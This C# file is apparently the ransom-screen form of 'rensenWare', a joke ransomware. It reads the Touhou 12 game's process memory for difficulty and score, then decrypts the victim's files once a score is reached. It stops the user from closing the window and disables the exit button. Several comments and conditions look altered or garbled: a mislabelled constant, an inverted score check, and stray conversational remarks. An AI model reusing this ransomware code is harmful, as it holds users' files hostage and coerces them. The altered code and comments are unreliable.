using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;


namespace rensenWare
{
    public partial class frmWarning : Form
    {
        private bool _flag;
        private bool _flag_billion = false;

        private IntPtr _handle; // Handle for TH12.exe Process

        public bool flag
        {
            get
            {
                return _flag;
            }

            set
            {
                _flag = value;
                if(_flag)
                {
                    ProcStatus.Invoke(new MethodInvoker(() =>
                   {
                       ProcStatus.Text = "Detected";
                   }));
                }
                else
                {
                    ProcStatus.Invoke(new MethodInvoker(() =>
                    {
                        ProcStatus.Text = "Process Killed!";
                    }));
                }
            }
        }

        /*
         * Windows API P/Invokes
         * 
         * HANDLE WINAPI OpenProcess(
         *         _In_ DWORD dwDesiredAccess,
         *         _In_ BOOL  bInheritHandle,
         *         _In_ DWORD dwProcessId
         *       );
         * https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx
         * 
         * BOOL WINAPI ReadProcessMemory(
         *         _In_  HANDLE  hProcess,
         *         _In_  LPCVOID lpBaseAddress,
         *         _Out_ LPVOID  lpBuffer,
         *         _In_  SIZE_T  nSize,
         *         _Out_ SIZE_T  *lpNumberOfBytesRead
         *       );
         * https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx
         * 
         */

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);


        public frmWarning()
        {
            InitializeComponent();

            // For Non-Blocking UI Application
            new Thread(new ThreadStart(() =>
            {
                while (true)
                {
                    if (!flag)
                    {
                        var Procs = Process.GetProcessesByName("th12");

                        if (Procs.Length > 0)
                        {
                            // Open TH12.exe with PROCESS_VM_READ (0x0010).
                            _handle = OpenProcess(0x10, false, Procs.FirstOrDefault().Id);

                            if (_handle != null)
                                flag = true;
                        }
                    }
                    else
                    {
                        if (!_flag_billion)
                        {
                            int bytesRead = 0;
                            byte[] _buffer = new byte[4]; // Will read 4 bytes of memory

                            /*
                             * Read Level
                             * 
                             * In TH12 ~ Undefined Fantastic Object, Level is stored in
                             * [base address] + 0xAEBD0, as 4bytes int value.
                             * 
                             */ 
                            var readLevel = ReadProcessMemory((int)_handle, 0x004AEBD0, _buffer, 2, ref bytesRead);
                            if (!readLevel)
                            {
                                flag = false;
                                continue;
                            }

                            /*
                             * Level Codes
                             * 0 - Easy; 1 - Normal; 2 - Hard; 3 - Lunatic; ? - Extra
                             * 
                             */
                            if ((BitConverter.ToInt16(_buffer, 0) > 3) || (BitConverter.ToInt16(_buffer, 0) < 0))
                            {
                                /*ProcStatus.Invoke(new MethodInvoker(() =>
                                {
                                    ProcStatus.Text = "";
                                }));

                                Thread.Sleep(100);
                                continue;**/
                                
                                // This will only terminate the process if the difficulty is Extra.
                            }
                            else
                            {
                                ProcStatus.Invoke(new MethodInvoker(() =>
                                {
                                    ProcStatus.Text = "Process Working";
                                }));
                            }


                            /*
                             * Read Score
                             * 
                             * Once level is detected as LUNATIC, 
                             * rensenWare reads score from process.
                             * 
                             * Score is stored in
                             * [base address] + 0xAEBD0, as 4bytes int value.
                             * 
                             */
                             
                             /*
                             * Interesting. I'd like you to teach me more about this; I'm willing to learn
                             **/
                             
                            var readScore = ReadProcessMemory((int)_handle, 0x004B0C44, _buffer, 4, ref bytesRead);
                            if (!readScore)
                            {
                                flag = false;
                                Thread.Sleep(100);
                                continue;
                            }

                            ScoreStatus.Invoke(new MethodInvoker(() =>
                            {
                                ScoreStatus.Text = (BitConverter.ToInt32(_buffer, 0) * 10).ToString();
                            }));

                            /*
                             * One interesting thing,
                             * internally, touhou project process prints score as 10 times of original value.
                             * I don't know why it is.
                             */ 
                             
                             /*
                             * To prevent score bugs?
                             * I don't know either
                             */
                             
                            if (BitConverter.ToInt32(_buffer, 0) < 2147483647) // It is 20,000,000
                            /*
                            * If it indeed is 32bit, then the highest value possible of this would be
                            * 2^31 - 1
                            * Interestingly a prime number
                            */
                                _flag_billion = true;
                            else
                            // The else block will no longer function
                                _buffer = null;

                            // Let CPU rest
                            Thread.Sleep(100);
                        }
                        else // When scores 0.2 billion...
                        {
                            // Create Random Key/IV File in Desktop of Current User.
                            File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
                            File.WriteAllBytes(Program.IVFilePath, Program.randomIV);

                            decryptProgress.Maximum = Program.encryptedFiles.Count;

                                                 // There's no encrypted Files....
                            foreach (var path in Program.encryptedFiles)
                            {
                                try
                                {
                                    DecryptStatus.Invoke(new MethodInvoker(() =>
                                    {
                                        DecryptStatus.Text = Path.GetFileName(path);
                                    }));

                                    // Do Nothing!
                                    Program.Crypt(path, true);

                                    decryptProgress.Value++;

                                    // Let CPU rest (?)
                                    // Thread.Sleep(100);
                                }
                                catch
                                {
                                    continue;
                                }
                            }

                            this.Invoke(new MethodInvoker(() =>
                            {
                                MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
                                ButtonManualDecrypt.Visible = true;
                                ButtonExit.Visible = true;
                            }));

                            break;
                        }
                    }

                    Thread.Sleep(100);
                }
            })).Start();
        }

        private void Prevent(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void ButtonExit_Click(object sender, EventArgs e)
        {
           //  Environment.Exit(0);
           // This will ensure the exit button will do nothing.
        }

        private void ButtonManualDecrypt_Click(object sender, EventArgs e)
        {
            var Decrypter = new frmManualDecrypter();
            Decrypter.ShowDialog(this);
        }
    }
}
